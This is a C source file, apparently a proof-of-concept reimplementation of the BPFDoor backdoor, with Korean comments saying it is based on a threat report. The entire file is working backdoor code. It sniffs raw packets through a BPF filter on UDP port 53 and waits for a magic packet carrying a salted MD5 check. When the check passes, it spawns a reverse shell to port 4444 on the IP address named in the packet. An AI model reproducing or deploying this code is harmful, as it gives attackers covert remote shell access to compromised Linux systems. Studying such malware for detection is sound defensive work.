// bpfdoorpoc.c (보고서 기반 리팩토링 버전)
// 기능: Raw Socket으로 Magic Packet 감지 → 해시 검증 → Reverse Shell 실행

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/if_ether.h>
#include <linux/filter.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <openssl/md5.h>

#define REVERSE_SHELL_PORT 4444
#define MAGIC_MARKER "9999"
#define SALT "I5*AYbs@LdaWbsO"

// 🧩 함수 선언
void apply_bpf_filter(int sd);
void reverse_shell(char *host, int port);

int main() {
    int sd, pkt_size;
    unsigned char *buf = malloc(65536);
    struct sockaddr saddr;
    socklen_t saddr_len = sizeof(saddr);

    // 1️⃣ Raw Socket 생성
    if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        perror("[!] Socket 생성 실패");
        exit(1);
    }

    // 2️⃣ BPF 필터 등록 (UDP 53)
    apply_bpf_filter(sd);
    printf("[*] Listening for Magic Packets...\n");

    while (1) {
        // 3️⃣ Magic Packet 수신
        pkt_size = recvfrom(sd, buf, 65536, 0, &saddr, &saddr_len);
        if (pkt_size < 0) {
            perror("[!] 패킷 수신 실패");
            continue;
        }

        // 4️⃣ 패킷 프로토콜 구분
        struct iphdr *ip = (struct iphdr *)(buf + sizeof(struct ethhdr));
        if (ip->protocol != IPPROTO_UDP) continue;

        struct udphdr *udp = (struct udphdr *)(buf + sizeof(struct ethhdr) + ip->ihl * 4);
        unsigned char *data = (unsigned char *)(udp + 1);
        int data_len = ntohs(udp->len) - sizeof(struct udphdr);

        if (data_len < 4 + 7 + 32) continue; // 최소 marker+ip+hash

        // 5️⃣ Magic Packet marker 검사
        if (strncmp((char *)data, MAGIC_MARKER, 4) != 0) continue;

        // 6️⃣ 공격자 IP 추출
        char attacker_ip[20] = {0};
        strncpy(attacker_ip, (char *)(data + 4), data_len - 36);  // 전체에서 32(hash)+4(marker) 제외

        // 7️⃣ 해시 추출
        char recv_hash[33] = {0};
        strncpy(recv_hash, (char *)(data + data_len - 32), 32);

        // 8️⃣ MD5(salt + IP) 계산
        char md5_input[64] = {0};
        unsigned char md5_raw[MD5_DIGEST_LENGTH];
        char md5_hex[33];

        snprintf(md5_input, sizeof(md5_input), "%s%s", SALT, attacker_ip);
        MD5((unsigned char *)md5_input, strlen(md5_input), md5_raw);

        for (int i = 0; i < MD5_DIGEST_LENGTH; i++) {
            sprintf(&md5_hex[i * 2], "%02x", md5_raw[i]);
        }
        md5_hex[32] = '\0';

        printf("[*] Received payload: %s\n", attacker_ip);
        printf("[*] MD5 hash: %s\n", md5_hex);

        // 9️⃣ 해시 일치 시 Reverse Shell 실행
        if (strcmp(md5_hex, recv_hash) == 0) {
            printf("[+] 해시 일치! Reverse Shell 시도 중...\n");
            pid_t pid = fork();
            if (pid == 0) reverse_shell(attacker_ip, REVERSE_SHELL_PORT);
            signal(SIGCHLD, SIG_IGN);
        }
    }

    close(sd);
    free(buf);
    return 0;
}

// 🔍 BPF 필터: UDP 포트 53만 수신
void apply_bpf_filter(int sd) {
    struct sock_filter filter[] = {
        { 0x28, 0, 0, 0x0000000c },
        { 0x15, 0, 4, 0x000086dd },
        { 0x30, 0, 0, 0x00000014 },
        { 0x15, 0, 11, 0x00000011 },
        { 0x28, 0, 0, 0x00000038 },
        { 0x15, 8, 9, 0x00000035 },
        { 0x15, 0, 8, 0x00000800 },
        { 0x30, 0, 0, 0x00000017 },
        { 0x15, 0, 6, 0x00000011 },
        { 0x28, 0, 0, 0x00000014 },
        { 0x45, 4, 0, 0x00001fff },
        { 0xb1, 0, 0, 0x0000000e },
        { 0x48, 0, 0, 0x00000010 },
        { 0x15, 0, 1, 0x00000035 },
        { 0x6, 0, 0, 0x00040000 },
        { 0x6, 0, 0, 0x00000000 },
    };
    struct sock_fprog bpf = {
        .len = sizeof(filter)/sizeof(filter[0]),
        .filter = filter
    };

    if (setsockopt(sd, SOL_SOCKET, SO_ATTACH_FILTER, &bpf, sizeof(bpf)) < 0) {
        perror("[!] BPF 필터 등록 실패");
        exit(1);
    }
}

// 🖥️ Reverse Shell 함수
void reverse_shell(char *host, int port) {
    int sockfd;
    struct sockaddr_in cnc;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    cnc.sin_family = AF_INET;
    cnc.sin_port = htons(port);
    cnc.sin_addr.s_addr = inet_addr(host);

    if (connect(sockfd, (struct sockaddr *)&cnc, sizeof(cnc)) < 0) {
        perror("[!] Reverse Shell 연결 실패");
        exit(1);
    }

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    execl("/bin/sh", "sh", NULL);
}
